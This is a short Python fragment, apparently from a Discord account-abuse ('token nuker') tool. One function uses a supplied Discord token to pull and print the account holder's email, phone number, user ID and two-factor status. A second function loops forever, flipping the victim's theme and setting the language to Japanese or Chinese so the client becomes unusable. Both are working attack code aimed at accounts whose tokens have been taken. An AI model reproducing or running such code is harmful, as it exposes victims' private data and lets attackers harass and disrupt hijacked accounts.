def tokenInfo(token):
    print('Status : [Token Info]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [Token]           {token}
            [Username]       {userName}
            [User ID]         {userID}
            [Email]           {email}
            [Phone Number]    {phone if phone else ""}
            [2 Factor Auth]        {mfa}
            ''')
            input()

def crashdiscord(token):
    print('\n')
    print('FLASH OUT!')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


